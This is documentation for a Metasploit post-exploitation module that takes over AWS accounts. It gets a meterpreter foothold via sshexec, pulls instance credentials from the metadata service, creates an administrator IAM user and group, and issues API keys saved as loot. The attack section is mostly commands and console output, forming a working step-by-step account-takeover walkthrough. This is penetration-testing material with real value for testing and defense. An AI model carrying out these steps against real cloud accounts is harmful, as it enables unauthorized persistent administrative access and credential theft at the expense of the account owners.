# aws_create_iam_user

aws_create_iam_user is a simple post module that can be used to take over AWS
accounts. Sure, it is fun enough to take over a single host, but you can own all
hosts in the account if you simply create an admin user.

## Privileges

This module depends on administrators being lazy and not using the least
privileges possible. Only on rare cases should instances have the following
privileges.

* iam:CreateUser
* iam:CreateGroup
* iam:PutGroupPolicy
* iam:AddUserToGroup
* iam:CreateAccessKey

## Establish a foothold

You first need a foothold in AWS, e.g., here we use `sshexec` to get the
foothold and launch a meterpreter session.

```
$ ./msfconsole
...
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > set password some_user
password => some_user
msf exploit(sshexec) > set username some_user
username => some_user
msf exploit(sshexec) > set RHOST 192.168.1.2
RHOST => 192.168.1.2
msf exploit(sshexec) > set payload linux/x86/meterpreter/bind_tcp
payload => linux/x86/meterpreter/bind_tcp
msf exploit(sshexec) > exploit -j
[*] Exploit running as background job.

[*] Started bind handler
msf exploit(sshexec) > [*] 192.168.1.2:22 - Sending stager...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Command Stager progress -  42.09% done (306/727 bytes)
[*] Command Stager progress - 100.00% done (727/727 bytes)
[*] Sending stage (1495599 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.1:33750 -> 192.168.1.2:4444) at 2016-11-21 17:58:42 +0000
```

We will be using session 1.

```
msf exploit(sshexec) > sessions

Active sessions
===============

  Id  Type                   Information                                                                       Connection
  --  ----                   -----------                                                                       ----------
  1   meterpreter x86/linux  uid=50011, gid=50011, euid=50011, egid=50011, suid=50011, sgid=50011 @ ip-19-...  192.168.1.1:41634 -> 192.168.1.2:4444 (192.168.1.2)

```

## Create IAM User

Now you can load `aws_create_iam_user` and specify a meterpreter sesssion,
e.g., `SESSION 1`.

```
msf exploit(sshexec) > use auxiliary/admin/aws/aws_create_iam_user
msf post(aws_create_iam_user) > set SESSION 1
SESSION => 1
msf post(aws_create_iam_user) > exploit

[*] 169.254.169.254:80 - looking for creds...
[*] Creating user: metasploit
[*] iam.amazonaws.com:443 - Connecting (iam.amazonaws.com)...
[!] Path: /
[!] UserName: metasploit
[!] Arn: arn:aws:iam::097986286576:user/metasploit
[!] UserId: AIDA...
[!] CreateDate: 2016-11-21T17:59:50.010Z
[*] Creating group: metasploit
[*] iam.amazonaws.com:443 - Connecting (iam.amazonaws.com)...
[!] Path: /
[!] GroupName: metasploit
[!] Arn: arn:aws:iam::097986286576:group/metasploit
[!] GroupId: AGPAIENI6YTM5JVRQ2452
[!] CreateDate: 2016-11-21T17:59:50.554Z
[*] Creating group policy: metasploit
[*] iam.amazonaws.com:443 - Connecting (iam.amazonaws.com)...
[!] xmlns: https://iam.amazonaws.com/doc/2010-05-08/
[!] ResponseMetadata: {"RequestId"=>"4c43248-d314-1226-bedd-234234232"}
[*] Adding user (metasploit) to group: metasploit
[*] iam.amazonaws.com:443 - Connecting (iam.amazonaws.com)...
[!] xmlns: https://iam.amazonaws.com/doc/2010-05-08/
[!] ResponseMetadata: {"RequestId"=>"4c43248-d314-1226-bedd-234234232"}
[*] Creating API Keys for metasploit
[*] iam.amazonaws.com:443 - Connecting (iam.amazonaws.com)...
[!] AccessKeyId: AKIA...
[!] SecretAccessKey: THE SECRET ACCESS KEY...
[!] AccessKeySelector: HMAC
[!] UserName: metasploit
[!] Status: Active
[!] CreateDate: 2016-11-21T17:59:51.967Z
[+] API keys stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
[*] Post module execution completed
msf post(aws_create_iam_user) > exit -y
```

You can see the API keys stored in loot:

```
$ cat ~/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt

{"AccessKeyId":"AKIA...","SecretAccessKey":"THE SECRET ACCESS KEY...","AccessKeySelector":"HMAC","UserName":"metasploit","Status":"Active","CreateDate":"2016-11-21T17:59:51.967Z"}
```